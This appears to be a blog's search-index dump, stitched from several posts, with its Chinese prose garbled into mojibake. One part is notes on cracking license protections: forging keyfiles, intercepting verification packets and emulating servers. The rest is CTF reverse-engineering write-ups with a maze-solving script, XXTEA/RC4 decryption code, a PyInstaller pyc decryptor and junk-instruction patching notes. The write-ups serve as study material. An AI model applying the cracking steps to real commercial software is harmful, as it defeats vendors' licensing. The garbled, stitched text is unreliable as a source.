SetFilePointer, SetFilePointerEx ç§»åŠ¨æ–‡ä»¶æŒ‡é’ˆ ReadFile è¯»å–æ–‡ä»¶å†…å®¹ æ‹†è§£ä¿æŠ¤ åˆ©ç”¨æ–‡ä»¶ç›‘è§†è½¯ä»¶æ‰¾åˆ°KeyFileæ–‡ä»¶å åˆ©ç”¨åå…­è¿›åˆ¶ç¼–è¾‘å™¨ä¼ªé€ KeyFile åŠ¨æ€è°ƒè¯•ï¼Œè·Ÿè¸ªæ–‡ä»¶å†…å®¹ å…·ä½“çš„ç ´è§£æ–¹æ³•ä¸è¾“å…¥åºåˆ—å·ç±»ä¼¼\nç½‘ç»œéªŒè¯ è½¯ä»¶å¿…é¡»ä»æœåŠ¡å™¨ä¸­å–å¾—ä¸€äº›å…³é”®æ•°æ®æ‰èƒ½æ­£ç¡®è¿è¡Œ\nç ´è§£çš„æ€è·¯æ˜¯æ‹¦æˆªæœåŠ¡å™¨çš„æ•°æ®åŒ…ï¼Œå¹¶åˆ†æç¨‹åºå¯¹è¯¥æ•°æ®åŒ…çš„å¤„ç†\nç›¸å…³API int send( SOCKET s, // å¥—æ¥å­—æè¿°ç¬¦ const char FAR *buf, // ç¼“å†²åŒº int len, // å‘é€æ•°æ®çš„å­—èŠ‚æ•° int flags // é™„åŠ æ ‡å¿—ï¼Œä¸€èˆ¬ä¸º0 ); int recv( SOCKET s, // å¥—æ¥å­—æè¿°ç¬¦ char FAR *buf, // ç¼“å†²åŒº int len, // ç¼“å†²åŒºbufçš„é•¿åº¦ int flags // é™„åŠ æ ‡å¿—ï¼Œä¸€èˆ¬ä¸º0 ); æ­¤å¤–ï¼Œè¿˜æœ‰å¾®è½¯æ‰©å±•å‡½æ•° WSASend å’Œ WSARecv\nç ´è§£æ€è·¯ å½“æœåŠ¡å™¨å‘é€çš„æ•°æ®åŒ…å›ºå®šæ—¶ï¼Œå¯ä»¥æ­å»ºæœ¬åœ°æœåŠ¡å™¨ï¼Œå‘é€è¯¥æ•°æ®åŒ…\næ•°æ®åŒ…ä¸å›ºå®šæ—¶ï¼Œéœ€è¦åˆ†æç®—æ³•\nåŠ å¯†ç®—æ³•â€”â€”å¸¸è§åŠ å¯†åº“æ¥å£åŠå…¶è¯†åˆ« å¯ä»¥ä½¿ç”¨ Flair å·¥å…·åˆ¶ä½œ IDA sig\nMiracl å¤§æ•°è¿ç®—åº“ å¤§æ•°åº“ï¼Œæ”¯æŒ RSAã€DH å¯†é’¥äº¤æ¢ã€DSA ä»¥åŠæ¤­åœ†æ›²çº¿ç­‰\nå­˜å‚¨æ–¹å¼ï¼šä»¥ $2^{32}$ è¿›åˆ¶è¡¨ç¤ºï¼Œä½ä½åœ¨å‰ï¼Œé«˜ä½åœ¨å\nè¯†åˆ«æ–¹å¼ï¼šMR_IN() æ˜¯é”™è¯¯å¤„ç†æ–¹å¼ï¼Œå‡ ä¹æ¯ä¸ªå‡½æ•°ä¸­éƒ½æœ‰\nmov dword ptr [eax+ecx*4+20], yy å…¶ä¸­ï¼Œyy å°±æ˜¯ MR_IN() çš„å‚æ•°ï¼Œä¸€æ¬¡å¯ä»¥ä» miracl.h ä¸­æ‰¾åˆ°å¯¹åº”çš„å‡½æ•°\nFGInt ç”¨äº Delphiï¼Œå¯å®ç°å¸¸è§å…¬é’¥åŠ å¯†ç³»ç»Ÿ\nå­˜å‚¨æ–¹å¼ï¼šä»¥ $2^{31}$ è¿›åˆ¶è¡¨ç¤º\nè¯†åˆ«æ–¹å¼ï¼šå‚æ•°ä¸ªæ•°ä»¥åŠè°ƒç”¨å‰åçš„æ•°æ®å˜åŒ–ï¼ˆé»‘ç›’ï¼‰æˆ–è€…ä½¿ç”¨ PEiD çš„ Krypto ANALyzer æ’ä»¶\nfreeLIP æœ€åˆç”¨äºç”¨äºè¿›è¡Œ RSA-129 æŒ‘æˆ˜ï¼Œ$2^{30}$ è¿›åˆ¶ï¼Œé€Ÿåº¦ä¸å¦‚ Miracl\nCrypto++ å®ç°äº†å¤§é‡çš„åŠ å¯†ç®—æ³•ï¼Œå¸¸ç”¨è¯†åˆ«æ–¹æ³•ä¸º IDA sigï¼Œéœ€è¦ç†Ÿç»ƒæŒæ¡åŠ å¯†ç®—æ³•\nLibTomCrypto åŒ…æ‹¬å¸¸è§çš„æ•£åˆ—ç®—æ³•ã€å¯¹ç§°ç®—æ³•ä»¥åŠå…¬é’¥åŠ å¯†ç®—æ³•\nGMP æ ¸å¿ƒé‡‡ç”¨äº†æ±‡ç¼–è¯­è¨€å®ç°ï¼Œé€Ÿåº¦éå¸¸å¿«ï¼Œé€šå¸¸ç”¨äºå®ç°å¤§æ•´æ•°åˆ†è§£\nOpenSSL ç”¨äºç½‘å®‰é¢†åŸŸï¼ŒåŒ…æ‹¬ä¸€äº›åŠ å¯†ç®—æ³•çš„å®ç°ï¼Œä¾‹å¦‚ BlowFishã€IDEAã€DESã€CASTï¼ŒRSAã€DSAï¼ŒMD5ã€RIPEMDã€SHA ç­‰\nå¯ä»¥åˆ° OpenSSL çš„ crypto ç›®å½•ä¸‹çš„åŠ å¯†ç®—æ³•æºç ä¸­å¯»æ‰¾ç¬¦åˆæ¡ä»¶çš„å‡½æ•°\nMicrosoft Crypto API å¯å‚è€ƒ MSDNï¼ŒIDAã€OllyDbg ç­‰è½¯ä»¶å‡å¯è¯†åˆ«\nNTL æ•°è®ºç›¸å…³ï¼Œå®ç°æœ‰ç¬¦å·çš„ã€ç®—æœ¯æ•´æ•°çš„è¿ç®—ï¼Œä»¥åŠå‘é‡ã€çŸ©é˜µã€åŸºäºæœ‰é™åŸŸå’Œæ•´æ•°çš„å¤šé¡¹å¼è¿ç®—\nDCP å’Œ DEC Delphi çš„åŠ å¯†ç®—æ³•åº“\nWindowså†…æ ¸åŸºç¡€ å†…æ ¸ç†è®ºåŸºç¡€ æƒé™çº§åˆ« CPUå°†æƒé™åˆ†ä¸º R0~R3 å…¶ä¸­ R0 æƒé™æœ€é«˜ï¼Œè¿è¡Œå†…æ ¸ï¼ŒR1 å’Œ R2 è¿è¡Œé©±åŠ¨ç¨‹åºï¼ŒR3 æƒé™æœ€ä½ï¼Œè¿è¡Œåº”ç”¨ç¨‹åº\næ“ä½œç³»ç»Ÿï¼ˆWindows, Linuxï¼‰ä¸ºæ–¹ä¾¿ï¼Œå°†å†…æ ¸å’Œé©±åŠ¨ç¨‹åºï¼ˆå†…æ ¸æ€ï¼‰è¿è¡Œåœ¨äº† R0 å±‚ï¼Œå°†åº”ç”¨ç¨‹åºï¼ˆç”¨æˆ·æ€ï¼‰è¿è¡Œåœ¨ R3 å±‚ï¼Œè€Œæ²¡æœ‰ä½¿ç”¨ R1 å’Œ R2 ï¼Œå› æ­¤ AMD64 å–æ¶ˆäº† R1 å’Œ R2 å±‚\nå†…å­˜ç©ºé—´å¸ƒå±€ 32ä½ç³»ç»Ÿè™šæ‹Ÿå†…å­˜ï¼š\n2GBå†…æ ¸ç©ºé—´ï¼Œ64KBçš„NULLç©ºé—´å’Œéæ³•ç©ºé—´ï¼Œå…¶ä½™ä¸ºè¿›ç¨‹ç©ºé—´\n64ä½ç³»ç»Ÿè™šæ‹Ÿå†…å­˜ï¼š\nWindowså®é™…ä¸º44ä½ï¼ˆ16TBï¼‰ï¼ŒLinuxå®é™…ä¸º48ä½ï¼ˆ256TBï¼‰\nå­˜åœ¨å¤§é‡ç©ºæ´\n+-+-+-+-+-+-+-+-+-+-+-+-+ 0x000000 | | +-+-+-+-+-+-+-+-+-+-+-+-+ 0x400000 | text | +-+-+-+-+-+-+-+-+-+-+-+-+ | data | +-+-+-+-+-+-+-+-+-+-+-+-+ | BSS | +-+-+-+-+-+-+-+-+-+-+-+-+ | heap | +-+-+-+-+-+-+-+-+-+-+-+-+ å‘ä¸‹å¢é•¿ | | | hole | | | +-+-+-+-+-+-+-+-+-+-+-+-+ 0x00002AAAAAAAA000 | å†…å­˜æ˜ å°„åŒºåŸŸ | +-+-+-+-+-+-+-+-+-+-+-+-+ å‘ä¸‹å¢é•¿ | | | hole | | | +-+-+-+-+-+-+-+-+-+-+-+-+ å‘ä¸Šå¢é•¿ | stack | +-+-+-+-+-+-+-+-+-+-+-+-+ 0x00007FFFFFFFF000=TASK_SIZE | æœªå®šä¹‰åŒºåŸŸ | +-+-+-+-+-+-+-+-+-+-+-+-+ 0xFFFF800000000000 | å†…æ ¸ç©ºé—´ | +-+-+-+-+-+-+-+-+-+-+-+-+ Windowså†…æ ¸å¯åŠ¨è¿‡ç¨‹ BIOS+MBR+Windows\nå¯åŠ¨è‡ªæ£€ ä»BIOSä¸­è½½å…¥å¿…è¦æŒ‡ä»¤ï¼Œè¿›è¡Œç¡¬ä»¶åˆå§‹åŒ–æ£€æŸ¥ï¼Œå¹¶æ˜¾ç¤ºä¿¡æ¯\nåˆå§‹åŒ–å¯åŠ¨ æ ¹æ®CMOSè®¾ç½®ï¼ŒBIOSåŠ è½½å¯åŠ¨ç›˜ï¼Œå°†å¼•å¯¼ä»£ç è½½å…¥å†…å­˜ï¼Œç”±MBRæ‰§è¡Œå¯åŠ¨è¿‡ç¨‹ã€‚å¯åŠ¨ä»£ç æœç´¢MBRçš„åˆ†åŒºè¡¨ï¼Œæ‰¾åˆ°æ´»åŠ¨åˆ†åŒºï¼Œå°†ç¬¬ä¸€ä¸ªæ‰‡åŒºçš„å¼•å¯¼ä»£ç è½½å…¥å†…å­˜ï¼Œæ£€æµ‹ç³»ç»Ÿå¹¶æŸ¥æ‰¾å¯åŠ¨ç®¡ç†å™¨ã€‚è¿‡å»ä¸º ntldr ï¼ŒWindows7å¼€å§‹ä½¿ç”¨ Bootmgrä½œä¸ºå¯åŠ¨ç®¡ç†ã€‚\nBootåŠ è½½ å¯¹å¯åŠ¨ç®¡ç†å™¨è¿›è¡Œè®¾ç½®\nè®¾ç½®å†…å­˜æ¨¡å¼ï¼š32ä½ç³»ç»Ÿ+32ä½CPUï¼Œè®¾ç½®ä¸º32ä½å†…å­˜æ¨¡å¼ï¼›64ä½ç³»ç»Ÿ+64ä½CPUï¼Œè®¾ç½®ä¸º64ä½å†…å­˜æ¨¡å¼ å¯åŠ¨ä¸€ä¸ªç®€å•çš„æ–‡ä»¶ç³»ç»Ÿï¼šå®šä½ boot.iniï¼Œntoskrnlï¼ŒHal ç­‰å¯åŠ¨æ–‡ä»¶ è¯»å– boot.ini æ–‡ä»¶ æ£€æµ‹å’Œé…ç½®ç¡¬ä»¶ æ£€æŸ¥å’Œé…ç½®ç¡¬ä»¶è®¾å¤‡ï¼Œå¦‚ç³»ç»Ÿå›ºä»¶ã€æ€»çº¿ã€é€‚é…å™¨ã€é”®ç›˜ç£ç›˜ç­‰ç­‰\nå†…æ ¸åŠ è½½ å¯åŠ¨ç®¡ç†å™¨å…ˆåŠ è½½å†…æ ¸ Ntoskrnl.exe å’Œç¡¬ä»¶æŠ½è±¡å±‚ HALã€‚HAL ä¼šå¯¹ç¡¬ä»¶åº•å±‚è¿›è¡Œéš”ç¦»ï¼Œä¸ºæ“ä½œç³»ç»Ÿæä¾›ç»Ÿä¸€çš„APIã€‚\néšåæ ¹æ®æ³¨å†Œè¡¨ HKEY_LOCAL_MACHINE\\System\\CurrentControlSet æ¥åŠ è½½é©±åŠ¨ç¨‹åº\næ³¨å†Œè¡¨ä¸­çš„ Start é”®è¡¨ç¤ºäº†å¯åŠ¨é¡ºåº\nSERVICE_BOOT_STARTï¼Œ å†…æ ¸åˆå§‹åŒ–æ—¶ï¼Œä¸ç³»ç»Ÿæ ¸å¿ƒç›¸å…³çš„é‡è¦é©±åŠ¨ç¨‹åº SERVICE_SYSTEM_START SERVICE_AUTO_STARTï¼Œç™»é™†ç•Œé¢å¼€å§‹ SERVICE_DEMAND_STARTï¼Œéœ€è¦æ—¶æ‰‹åŠ¨åŠ è½½ SERVICE_DISABLEDï¼Œç¦æ­¢åŠ è½½ Windowsä¼šè¯ç®¡ç†å¯åŠ¨ smss.exe æ˜¯Windowsä¸­ç¬¬ä¸€ä¸ªåˆ›å»ºçš„ç”¨æˆ·æ¨¡å¼è¿›ç¨‹ï¼Œä¸»è¦ç”¨äº\nåˆ›å»ºç³»ç»Ÿç¯å¢ƒå˜é‡ åŠ è½½ win32k.sysï¼ŒWindowså­ç³»ç»Ÿçš„å†…æ ¸æ¨¡å¼éƒ¨åˆ† å¯åŠ¨ csrss.exeï¼ŒWindowså­ç³»ç»Ÿçš„ç”¨æˆ·æ¨¡å¼éƒ¨åˆ† å¯åŠ¨ winlogon.exe åˆ›å»ºè™šæ‹Ÿå†…å­˜é¡µé¢æ–‡ä»¶ æ‰§è¡Œé‡å¯å‰æœªå®Œæˆçš„é‡å‘½åå·¥ä½œ ","date":"2021-09-25T02:15:45+08:00","image":"/post/note-of-book-encryption-and-decryption/cover_huf14a87ae5877971d635f5feb6ec88f93_885732_120x120_fill_q75_box_smart1.jpg","permalink":"/post/note-of-book-encryption-and-decryption/","title":"åŠ å¯†ä¸è§£å¯†å­¦ä¹ ç¬”è®°ï¼ˆæŒç»­æ›´æ–°ingï¼‰"},{"content":" RE1ï¼šè¿·å®« RE2ï¼šsoå±‚ æœ€åä¸€ä¸ªå¥½åƒæ˜¯phpï¼Ÿå‘Šè¾\nRE1 ç¨‹åºé€»è¾‘å¾ˆç®€å•ï¼Œå°±æ˜¯ä¸€ä¸ªè¿·å®«ï¼Œè¿·å®«çš„æ¯ä¸€ä¸ªä½ç½®å†™æˆäº†ä¸€ä¸ªå‡½æ•°ï¼Œä¸€å¼€å§‹æƒ³æ‰‹åŠ¨æ¨ä¸€ä¸‹è¯•è¯•ï¼Œç»“æœå‘ç°æœ‰çš„æ ¼å­å¯èƒ½æœ‰å¤šæ¡è·¯å¾„ï¼Œç„¶åæƒ³åç€æ¨ï¼Œç„¶åå‘ç°æœ‰ç›¸åŒçš„é—®é¢˜\u0026hellip;\nè€ƒè™‘å†™è‡ªåŠ¨åŒ–è„šæœ¬ï¼Œä¸€å¼€å§‹æƒ³è¯•è¯•angrï¼ŒåŒæ ·æœ‰å¾ˆå¤šé—®é¢˜ï¼Œæƒ³ç”¨idaapiåˆåªèƒ½ç°æŸ¥å„ç§api\nåæ¥åœ¨æ‰‹åŠ¨æ‰§è¡Œçš„æ—¶å€™ï¼Œå‘ç°é”™è¯¯è¾“å…¥å’Œæ­£ç¡®è¾“å…¥ä¹‹é—´çš„åŒºåˆ«æ˜¯åé¦ˆä¸åŒï¼Œè€Œä¸”èµ°é”™è·¯å¾„çš„è¯ä¸éœ€è¦é€€å‡ºï¼Œç›´æ¥åŸè·¯è¿”å›å°±è¡Œï¼Œäºæ˜¯è€ƒè™‘ç›´æ¥ç”¨pwntoolsæ¨¡æ‹Ÿæ‰‹åŠ¨æ‰§è¡Œ\nç›´æ¥ç®€å•å›æº¯\nimport sys sys.setrecursionlimit(20000) from pwn import * success = [ b\u0026#39;Just do it\\n\u0026#39;, b\u0026#39;GOGOGO\\n\u0026#39;, b\u0026#39;Wuhu~!\\n\u0026#39;, b\u0026#39;Wuhu\\n\u0026#39;, b\u0026#39;You are so good\\n\u0026#39;, b\u0026#39;Nice.\\n\u0026#39;, b\u0026#39;Yeah~~\\n\u0026#39;, b\u0026#39;Yeah~~~\\n\u0026#39;, b\u0026#39;Let\\\u0026#39;s go.\\n\u0026#39;, b\u0026#39;Never stop\\n\u0026#39;, b\u0026#39;So smart\\n\u0026#39;, ] p = process(\u0026#39;./maze\u0026#39;) # solvepath = \u0026#34;SSSSSSSSSDDDDDDWWWWAAWWAASSSSD\u0026#34; # context(os=\u0026#39;linux\u0026#39;, arch=\u0026#39;amd64\u0026#39;, log_level=\u0026#39;debug\u0026#39;) # solveend = \u0026#34;AASSDDSSSSDDS\u0026#34; # solvepath = \u0026#39;S\u0026#39; * 8 solvepath = \u0026#39;S\u0026#39; * 8 direct = [\u0026#39;W\u0026#39;, \u0026#39;A\u0026#39;, \u0026#39;D\u0026#39;, \u0026#39;S\u0026#39;] p.recvuntil(b\u0026#39;You can only go south.\\n\u0026#39;) for i in solvepath: p.send(i) print (p.recvline(), i) def dfs(): global solvepath for cur in direct: if direct.index(solvepath[-1]) + direct.index(cur) != 3: p.send(cur) rev = p.recvline() # print (rev, cur) if rev in success: solvepath += cur # print (solvepath) dfs() # print (direct[3 - direct.index(solvepath[-1])]) p.send(direct[3 - direct.index(solvepath[-1])]) solvepath = solvepath[:-1] p.recvline() elif b\u0026#39;Good Job.\u0026#39; in rev: print (solvepath + cur) exit(0) dfs() è¿è¡Œç»“æœæ‹¿å»ç®—ä¸ªmd5å°±è¡Œ\nRE2 è¿™é¢˜æ‰æ˜¯ä¼ ç»Ÿçš„é€†å‘å•Šï¼Œä¸ºä»€ä¹ˆåšçš„äººåè€Œæ¯”ç¬¬ä¸€é¢˜å°‘\u0026hellip;\nçœ‹ä¸€ä¸‹jebï¼Œå‘ç°åŠ å¯†åœ¨soå±‚ï¼Œç›´æ¥idaçœ‹soå±‚\nå‘ç°å…ˆè¿›è¡Œäº†ä¸€ä¸ªRC4ï¼Œç„¶åæ˜¯ä¸€ä¸ªXXTEA\nç›´æ¥è§£å¯†\nè§£å¯†ä»£ç æ¥è‡ª NewBieReer å¸ˆå‚…\nå…ˆä¸ŠXXTEAæ¨¡æ¿\n#include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdint.h\u0026gt; #define DELTA 0x9e3779b9 #define MX (((z\u0026gt;\u0026gt;5^y\u0026lt;\u0026lt;2) + (y\u0026gt;\u0026gt;3^z\u0026lt;\u0026lt;4)) ^ ((sum^y) + (key[(p\u0026amp;3)^e] ^ z))) void btea(uint32_t *v, int n, uint32_t const key[4]) { uint32_t y, z, sum; unsigned p, rounds, e; rounds = 6 + 52/n; //12 52/6 = 8 n sum = rounds*DELTA; y = v[0]; do { e = (sum \u0026gt;\u0026gt; 2) \u0026amp; 3; for (p=n-1; p\u0026gt;0; p--) { z = v[p-1]; y = v[p] -= MX; } z = v[n-1]; y = v[0] -= MX; sum -= DELTA; } while (--rounds); } int main(){ uint32_t v[9] = {0x68E5973E, 0x0C20C7367, 0x98AFD41B, 0xFE4B9DE2, 0x1A5B60B, 0x3D36D646, 0xDBCC7BAF, 0xA0414F00, 0x762CE71A }; uint32_t const k[4] = {0x1,0x10,0x100,0x1000}; int n = 9; btea(v,n,k); printf(\u0026#34;è§£å¯†åçš„æ•°æ®ï¼š0x%08x 0x%08x 0x%08x 0x%08x 0x%08x 0x%08x 0x%08x 0x%08x %08x\\n\u0026#34;,v[0],v[1],v[2],v[3],v[4],v[5],v[6],v[7],v[8]); } ç„¶åå†æ¥ä¸€ä¸ªRC4\ndef __rc4_init(key): keylength = len(key) S = list(range(256)) j = 0 for i in range(256): j = (j + S[i] + int(key[i % keylength])) % 256 S[i], S[j] = S[j], S[i] return S def rc4_crypt(key, data): S = __rc4_init(key) i = j = 0 result = b\u0026#39;\u0026#39; for a in data: i = (i + 1) % 256 j = (j + S[i]) % 256 S[i], S[j] = S[j], S[i] k = (a ^ S[(S[i] + S[j]) % 256]).to_bytes(1, \u0026#39;big\u0026#39;) print (hex(S[(S[i] + S[j]) % 256])) result += k return result if __name__ == \u0026#34;__main__\u0026#34;: from libnum import n2s, s2n key = b\u0026#39;\\x01\\x00\\x00\\x00\\x10\\x00\\x00\\x00\\x00\\x01\\x00\\x00\\x00\\x10\\x00\\x00\u0026#39; data = n2s(0x5604b0d49c634d3096cec00593be3b82524b16b28a33b74d6d7b9950c2b10c12e1840a93) def convert(k): ret = [] while k \u0026gt; 0: ret.append(k \u0026amp; 0xff) k \u0026gt;\u0026gt;= 8 return ret[::-1] result_rc4 = rc4_crypt(key,data) print(result_rc4) æ³¨æ„ä¸€ä¸‹å¤§å°ç«¯å°±è¡Œ\n","date":"2021-08-04T13:48:58Z","permalink":"/post/2021dfjk-re/","title":"dfjk 2021 RE"},{"content":"imnotavirus è§£exeï¼Œè§£å¯†pyc\nåˆ©ç”¨è§£å¯†åçš„pycï¼Œæ‰¾åˆ°æ³¨å…¥çš„shellcodeï¼Œç”¨idaè§£smcï¼Œæœ€åè§£å¯†\næ¯”èµ›çš„æ—¶å€™è¿˜è¢«è¿«é˜…è¯»äº†ä¸€ä¸‹pyinstallerçš„æºç ï¼Œæ”¶è·å¾ˆå¤§\nè§£exe çœ‹åˆ°é™„ä»¶ç»™äº†ä¸ªpyinstallerï¼ŒçŒœæµ‹æ˜¯pythoné€†å‘\nå…ˆidaçœ‹ä¸€çœ¼ï¼Œæœ‰upxå£³ï¼Œè‡ªåŠ¨è„±å£³ï¼Œå†ç”¨exeinfoç¡®è®¤äº†ä¸€ä¸‹æ˜¯pythoné€†å‘ï¼Œpyinstxtractor.pyè§£åŒ…ï¼ˆä¹‹å‰V\u0026amp;N2021å°±åƒäº†è¿™ä¸ªäºï¼‰\nè§£pyc è§£åŒ…æ—¶æç¤ºè¢«åŠ å¯†äº†\nå–structå¤´ä½œä¸ºæ ‡å‡†å¤´ï¼Œç”¨pycdcè¿˜åŸå‡ºmain.pyï¼Œå‘ç°è°ƒç”¨äº†sign\nå»PYZ00æ–‡ä»¶å¤¹çœ‹ä¸€ä¸‹ï¼Œå‘ç°è¢«åŠ å¯†äº†ï¼Œçœ‹ä¸€ä¸‹ç›®å½•ï¼Œå‘ç°pyimodå’Œæ¯”ä¸€èˆ¬æƒ…å†µå¤šäº†ä¸€äº›ä¸œè¥¿ï¼ŒæŠŠè¿™äº›éƒ½è§£å¼€çœ‹ä¸€ä¸‹ï¼Œæœ‰ä¸€ä¸ªkeyæ–‡ä»¶\nåŒæ—¶å‘ç°archiveä¸­æœ‰ä¸€ä¸ªCipherç±»ï¼Œä½†æ˜¯pycdcç¼ºå°‘æŒ‡ä»¤ï¼Œæ— æ³•å…¨éƒ¨è¿˜åŸï¼Œè€ƒè™‘çœ‹ä¸€ä¸‹pycdasè§£å‡ºæ¥çš„å­—èŠ‚ç \nå­—èŠ‚ç ä¸­æœ‰ä¸ªå¯¹pyinstalleræºç çš„å¼•ç”¨ï¼Œç›´æ¥å»æ–‡ä»¶å¤¹é‡Œé¢çœ‹ï¼Œå‘ç°èƒ½è§£å¯†å‡ºæ¥çš„éƒ¨åˆ†å®Œå…¨ä¸€è‡´\nç…§ç€æºç ä¸­çš„æ–¹æ³•è§£å¯†sign\nfrom key import key import tinyaes print (key) f = open(\u0026#39;./PYZ-00.pyz_extracted/sign.pyc.encrypted\u0026#39;, \u0026#39;rb\u0026#39;) data = f.read() cipher = tinyaes.AES(key.encode(), data[:16]) output = cipher.CTR_xcrypt_buffer(data[16:]) f.close() import zlib output = zlib.decompress(output) f = open(\u0026#39;./sign.pyc\u0026#39;, \u0026#39;wb\u0026#39;) f.write(output) è§£å¯† è§£å‡ºsignåçœ‹åˆ°æœ‰ä¸‰ä¸ªbase64ï¼Œå…¶ä¸­ä¸¤ä¸ªæ˜¯æ‰§è¡Œçš„è¯­å¥ï¼Œæ­¤å¤–å¤§éƒ¨åˆ†è¯­å¥æ¶‰åŠåˆ°äº†å†…å­˜\nå¦å¤–ä¸€ä¸ªbaseè§£å‡ºæ¥æ˜¯ä¹±ç ï¼Œç”¨å­—èŠ‚ç è¾…åŠ©æ¢å¤å‡½æ•°ï¼ˆå…¶å®ç‰¹å¾å·²ç»å¾ˆæ˜æ˜¾äº†ï¼‰ï¼Œå‘ç°è¿›è¡Œäº†rc4åŠ å¯†ï¼Œç›´æ¥æ‰“å°å‡ºè§£å¯†ç»“æœï¼Œå°†ç»“æœå†™å…¥æ–‡ä»¶ï¼Œç”¨idaæŸ¥çœ‹\nå‘ç°smc\nmov eax, 41178Bh mov ecx, 411802h sub ecx, eax loc_2A: mov ebx, [rax] xor ebx, 77h mov [rax], ebx loop loc_2A è§£å‡ºæ¥åå°è¯•æ¢å¤äº†ä¸€ä¸‹å‡½æ•°ï¼Œç»“æœå¾ˆä¸‘\u0026hellip;åªèƒ½å’Œæ±‡ç¼–æ¯”è¾ƒç€è¿›è¡Œåˆ†æäº†ï¼ˆå¥½åƒåªè¦æŠŠ00 patchä¸€ä¸‹å°±å¯ä»¥åç¼–è¯‘äº†ï¼‰\nseg000:000000000000007E loc_7E: ; CODE XREF: sub_0+73â†‘j seg000:000000000000007E mov eax, [rbp+var_20] seg000:0000000000000081 cmp eax, [rbp+var_8] seg000:0000000000000084 jge short loc_B2 seg000:0000000000000086 mov eax, [rbp+8] seg000:0000000000000089 add eax, [rbp+var_20] seg000:000000000000008C movsx ecx, byte ptr [rax] seg000:000000000000008F xor ecx, 13h seg000:0000000000000092 mov edx, [rbp+8] seg000:0000000000000095 add edx, [rbp+var_20] seg000:0000000000000098 mov [rdx], cl seg000:000000000000009A mov eax, [rbp+8] seg000:000000000000009D add eax, [rbp+var_20] seg000:00000000000000A0 movsx ecx, byte ptr [rax+1] seg000:00000000000000A4 xor ecx, 37h seg000:00000000000000A7 mov edx, [rbp+8] seg000:00000000000000AA add edx, [rbp+var_20] seg000:00000000000000AD mov [rdx+1], cl seg000:00000000000000B0 jmp short loc_75 å‘ç°æ˜¯ä¸¤ä¸¤ä¸€ç»„è¿›è¡ŒåŠ å¯†ï¼Œåˆ†åˆ«å¼‚æˆ–0x13å’Œ0x37\n\u0026gt;\u0026gt;\u0026gt; for i in range(len(cipher)): ... if i % 2 == 0: ... print (chr(cipher[i] ^ 0x13), end = \u0026#39;\u0026#39;) ... else: ... print (chr(cipher[i] ^ 0x37), end = \u0026#39;\u0026#39;) ... @rey0ug0nn2$1gnth1s0r1tw1llb3y0ursurv1 å†…å· è¿™é¢˜æ˜¯èµ›åè¾¹è¡¥è¾¹å†™çš„ï¼Œæ‰€ä»¥åºŸè¯ç•¥å¤š\nèŠ±æŒ‡ä»¤ æœç´¢é™æ€å­—ç¬¦ä¸²èƒ½æ‰¾åˆ°å¾ˆå¤šæœ‰ç”¨çš„å­—ç¬¦ä¸²ï¼Œä½†å‘ç°æ‰¾ä¸åˆ°å¼•ç”¨\nä»startå¼€å§‹å¾€é‡Œé¢ç¿»ä¸€ç¿»ï¼Œå‘ç°æœ‰ä¸ªä¸€å¤§ç‰‡æ•°æ®æ²¡æœ‰è¢«è§£æå‡ºæ¥ï¼Œè¯´æ˜æ˜¯ä¸ªèŠ±æŒ‡ä»¤ï¼Œä¹‹å‰æ²¡è§è¿‡è¿™ä¸ªèŠ±ï¼Œç®€å•è®°å½•ä¸€ä¸‹\n.text:00000001400016AB call loc_1400016B3 .text:00000001400016AB ; --------------------------------------------------------------------------- .text:00000001400016B0 db 0E8h, 0EBh, 12h .text:00000001400016B3 ; --------------------------------------------------------------------------- .text:00000001400016B3 .text:00000001400016B3 loc_1400016B3: ; CODE XREF: sub_1400015E2+C9â†‘j .text:00000001400016B3 pop rax ; å–å‡ºæ ˆé¡¶æ•°æ® .text:00000001400016B4 add rax, 1 ; å¯¹å…¶è¿›è¡Œ+1 .text:00000001400016B8 push rax ; ç„¶åå†å‹æ ˆ .text:00000001400016B9 mov rax, rsp .text:00000001400016BC xchg rax, [rax] .text:00000001400016BF pop rsp .text:00000001400016C0 mov [rsp+0], rax .text:00000001400016C4 retn è¿™ä¸ªèŠ±é•¿è¿™æ ·ï¼Œæ‰€ä»¥ Call loc_1400016B3 çš„æ“ä½œå°±æ˜¯è·³è¿‡ E8ï¼ŒæŠŠç¬¬ä¸€ä¸ªE8 patchæˆnopï¼Œå‘ç°EB 12å°±æ˜¯è·³åˆ°è¿™ä¸ªå‡½æ•°çš„åé¢ï¼Œæ‰€ä»¥è¿™æ¡ Call æŒ‡ä»¤ä¹Ÿå¯ä»¥Patchæ‰\nè¿˜æœ‰ä¸€äº›é•¿è·³è½¬ï¼Œè¿™ä¸ªå°±ç›´æ¥æŒ‰cè½¬æˆæŒ‡ä»¤å°±è¡Œ\nè¿˜æœ‰è¿™ä¸ªèŠ±\n.text:0000000140006D12 loc_140006D12: ; CODE XREF: sub_1400015E2:loc_140006D12â†‘j .text:0000000140006D12 jmp short near ptr loc_140006D12+1 æŠŠ jmp æŒ‡ä»¤çš„ç¬¬ä¸€ä¸ªå­—èŠ‚patchäº†å°±è¡Œ\nèŠ±æŒ‡ä»¤å…¨éƒ¨å»æ‰ä¹‹åå‘ç°ç»“å°¾è¿˜æœ‰ä¸€éƒ¨åˆ†æ²¡æœ‰åç¼–è¯‘ï¼Œè¿™ä¸ªæ¯”èµ›çš„æ—¶å€™æ²¡æƒ³å‡ºæ¥æ€ä¹ˆæï¼Œä¸çŸ¥é“æ€ä¹ˆå›æ—¶ï¼Œæ‰€ä»¥è¿™é¢˜åé¢ä¹Ÿå°±æ²¡æœ‰æ€ä¹ˆåšäº†\nè¿ç®—ç®€åŒ– æ¯”èµ›çš„æ—¶å€™æƒ³ç›´æ¥åŠ¨è°ƒè·³è¿‡è¿™äº›è¿ç®—çš„ï¼Œç»“æœçœ‹åˆ°å’Œinputè¿˜æœ‰å…³ç³»ï¼Œè¿™å°±ä¸å¥½åŠäº†ï¼Œå°è¯•æ‰‹åŠ¨çœ‹ä¸€ä¸‹è¿™æ˜¯ä»€ä¹ˆè¿ç®—ï¼Œä½†ä¹Ÿæ²¡å•¥æƒ³æ³•\nç»“æœï¼Œæ™šä¸Šå†çœ‹è¿™é“é¢˜çš„æ—¶å€™å‘ç°ç«Ÿç„¶çœ‹æ‡‚è¿™ä¸ªç¦»è°±è¿ç®—äº†ï¼Œå•Šå•Šå•Šå•Šå•Šå¥½æ°”å•Š\nè™½ç„¶æœ‰ä¸€å 